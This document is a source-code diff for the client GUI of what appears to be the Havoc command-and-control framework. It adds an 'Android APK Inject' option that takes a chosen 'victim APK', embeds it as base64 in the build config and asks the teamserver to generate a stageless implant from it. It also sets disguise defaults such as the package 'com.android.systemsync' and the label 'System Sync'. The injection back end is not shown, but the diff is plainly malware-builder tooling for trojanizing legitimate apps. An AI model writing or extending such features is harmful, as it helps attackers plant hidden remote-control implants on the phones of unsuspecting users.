@@ -8,6 +8,8 @@
 
 #include <QIODevice>
 #include <QFileDialog>
+#include <QHBoxLayout>
+#include <QPushButton>
 #include <QJsonArray>
 #include <QHeaderView>
 #include <vector>
@@ -124,9 +126,16 @@ void Payload::setupUi( QDialog* Dialog )
     connect( ComboFormat, &QComboBox::currentTextChanged, this, [&]( const QString& text ){
 
         if ( ComboAgentType->currentText().compare( "Demon" ) == 0 )
+        {
             DefaultConfig();
+        }
         else if ( ComboAgentType->currentText().compare( "DemonPosix" ) == 0 )
-            PosixDefaultConfig();
+        {
+            if ( text.compare( "Android APK Inject" ) == 0 )
+                AndroidInjectConfig();
+            else
+                PosixDefaultConfig();
+        }
 
     } );
 
@@ -220,6 +229,65 @@ void Payload::buttonGenerate()
     }
 
     ConsoleText->clear();
+
+    // For APK injection: validate victim APK is selected and embed it as base64
+    if ( ComboFormat->currentText().compare( "Android APK Inject" ) == 0 )
+    {
+        if ( SourceApkPath.isEmpty() )
+        {
+            MessageBox( "Payload Generator Error", "Please select a victim APK file first.", QMessageBox::Critical );
+            return;
+        }
+
+        QFile ApkFile( SourceApkPath );
+        if ( !ApkFile.open( QIODevice::ReadOnly ) )
+        {
+            MessageBox( "Payload Generator Error", "Cannot read victim APK: " + SourceApkPath, QMessageBox::Critical );
+            return;
+        }
+        auto ApkBytes = ApkFile.readAll();
+        ApkFile.close();
+
+        if ( ApkBytes.isEmpty() )
+        {
+            MessageBox( "Payload Generator Error", "Victim APK is empty.", QMessageBox::Critical );
+            return;
+        }
+
+        // Inject SourceApk (base64) into the Config JSON
+        auto ConfigDoc = GetConfigAsJson();
+        auto ConfigObj = ConfigDoc.object();
+        ConfigObj.insert( "SourceApk", QString::fromLatin1( ApkBytes.toBase64() ) );
+        ConfigDoc.setObject( ConfigObj );
+
+        auto Config  = ConfigDoc.toJson().toStdString();
+        auto Package = new Util::Packager::Package;
+
+        auto Head = Util::Packager::Head_t {
+                .Event   = Util::Packager::Gate::Type,
+                .User    = HavocX::Teamserver.User.toStdString(),
+                .Time    = CurrentTime().toStdString(),
+                .OneTime = "true",
+        };
+
+        auto Body = Util::Packager::Body_t {
+                .SubEvent = Util::Packager::Gate::Stageless,
+                .Info = {
+                    { "AgentType", this->ComboAgentType->currentText().toStdString() },
+                    { "Listener",  this->ComboListener->currentText().toStdString() },
+                    { "Arch",      this->ComboArch->currentText().toStdString() },
+                    { "Format",    this->ComboFormat->currentText().toStdString() },
+                    { "Config",    Config },
+                },
+        };
+
+        Package->Head = Head;
+        Package->Body = Body;
+        HavocX::GateGUI = true;
+
+        HavocX::Connector->SendPackage( Package );
+        return;
+    }
 
     auto Config  = GetConfigAsJson().toJson().toStdString();
     auto Package = new Util::Packager::Package;
@@ -368,6 +436,7 @@ auto Payload::CtxAgentPayloadChange( const QString& AgentType ) -> void
             ComboFormat->addItem( "Android Exe" );
             ComboFormat->addItem( "Android SO" );
             ComboFormat->addItem( "Android APK" );
+            ComboFormat->addItem( "Android APK Inject" );
 
             ComboArch->clear();
             ComboArch->addItem( "x64" );
@@ -477,6 +546,103 @@ auto Payload::PosixDefaultConfig() -> void
     ItemWorkHours->setFlags( Qt::NoItemFlags );
     ItemWorkHours->setText(  0, "Working Hours" );
     TreeConfig->setItemWidget( ItemWorkHours, 1, WorkHoursEdit );
+
+    // ── Package Name ─────────────────────────────────────────────────────
+    auto ItemPkgName  = new QTreeWidgetItem( TreeConfig );
+    auto PkgNameEdit  = new QLineEdit( "com.android.systemsync" );
+    PkgNameEdit->setObjectName( "ConfigItem" );
+    PkgNameEdit->setPlaceholderText( "e.g. com.android.systemsync" );
+    ItemPkgName->setFlags( Qt::NoItemFlags );
+    ItemPkgName->setText(  0, "PackageName" );
+    TreeConfig->setItemWidget( ItemPkgName, 1, PkgNameEdit );
+
+    // ── App Label ────────────────────────────────────────────────────────
+    auto ItemAppLabel  = new QTreeWidgetItem( TreeConfig );
+    auto AppLabelEdit  = new QLineEdit( "System Sync" );
+    AppLabelEdit->setObjectName( "ConfigItem" );
+    AppLabelEdit->setPlaceholderText( "Launcher label" );
+    ItemAppLabel->setFlags( Qt::NoItemFlags );
+    ItemAppLabel->setText(  0, "AppLabel" );
+    TreeConfig->setItemWidget( ItemAppLabel, 1, AppLabelEdit );
+}
+
+auto Payload::AndroidInjectConfig() -> void
+{
+    TreeConfig->clear();
+    SourceApkPath.clear();
+
+    auto DemonConfig = HavocX::Teamserver.DemonConfig;
+
+    // ── Sleep / Jitter ──────────────────────────────────────────────────
+    auto ItemSleep  = new QTreeWidgetItem( TreeConfig );
+    auto ItemJitter = new QTreeWidgetItem( TreeConfig );
+
+    auto Jitter = DemonConfig[ "Jitter" ].toInt();
+    if ( Jitter < 0 || Jitter > 100 ) Jitter = 5;
+
+    auto SleepEdit  = new QLineEdit( QString::number( DemonConfig[ "Sleep" ].toInt() ) );
+    auto JitterEdit = new QLineEdit( QString::number( Jitter ) );
+    SleepEdit->setObjectName(  "ConfigItem" );
+    JitterEdit->setObjectName( "ConfigItem" );
+
+    ItemSleep->setFlags(  Qt::NoItemFlags );
+    ItemJitter->setFlags( Qt::NoItemFlags );
+    ItemSleep->setText(   0, "Sleep"  );
+    ItemJitter->setText(  0, "Jitter" );
+    TreeConfig->setItemWidget( ItemSleep,  1, SleepEdit  );
+    TreeConfig->setItemWidget( ItemJitter, 1, JitterEdit );
+
+    // ── Source APK file picker ───────────────────────────────────────────
+    auto ItemApk    = new QTreeWidgetItem( TreeConfig );
+    auto ApkWidget  = new QWidget();
+    auto ApkLayout  = new QHBoxLayout( ApkWidget );
+    ApkLayout->setContentsMargins( 0, 0, 0, 0 );
+    ApkLayout->setSpacing( 4 );
+
+    auto ApkLabel  = new QLineEdit();
+    ApkLabel->setObjectName( "SourceApkLabel" );
+    ApkLabel->setReadOnly( true );
+    ApkLabel->setPlaceholderText( "Click Browse to select victim APK..." );
+
+    auto ApkBrowse = new QPushButton( "Browse" );
+    ApkBrowse->setFixedWidth( 70 );
+
+    ApkLayout->addWidget( ApkLabel );
+    ApkLayout->addWidget( ApkBrowse );
+    ApkWidget->setLayout( ApkLayout );
+
+    ItemApk->setFlags( Qt::NoItemFlags );
+    ItemApk->setText(  0, "Source APK" );
+    TreeConfig->setItemWidget( ItemApk, 1, ApkWidget );
+
+    // ── Package Name ─────────────────────────────────────────────────────
+    auto ItemPkgName2  = new QTreeWidgetItem( TreeConfig );
+    auto PkgNameEdit2  = new QLineEdit( "com.demon.agent" );
+    PkgNameEdit2->setObjectName( "ConfigItem" );
+    PkgNameEdit2->setPlaceholderText( "Internal agent package (e.g. com.demon.agent)" );
+    ItemPkgName2->setFlags( Qt::NoItemFlags );
+    ItemPkgName2->setText(  0, "PackageName" );
+    TreeConfig->setItemWidget( ItemPkgName2, 1, PkgNameEdit2 );
+
+    // Connect browse button
+    connect( ApkBrowse, &QPushButton::clicked, this, [this, ApkLabel]() {
+        auto Style = FileRead( ":/stylesheets/Dialogs/FileDialog" ).toStdString();
+        Style.erase( std::remove( Style.begin(), Style.end(), '\n' ), Style.end() );
+
+        auto FileDialog = QFileDialog();
+        FileDialog.setStyleSheet( Style.c_str() );
+        FileDialog.setAcceptMode( QFileDialog::AcceptOpen );
+        FileDialog.setNameFilter( "Android APK (*.apk)" );
+        FileDialog.setDirectory( QDir::homePath() );
+
+        if ( FileDialog.exec() == QFileDialog::Accepted ) {
+            auto urls = FileDialog.selectedUrls();
+            if ( !urls.isEmpty() ) {
+                SourceApkPath = urls.value(0).toLocalFile();
+                ApkLabel->setText( SourceApkPath );
+            }
+        }
+    } );
 }
 
 auto Payload::Clear() -> void
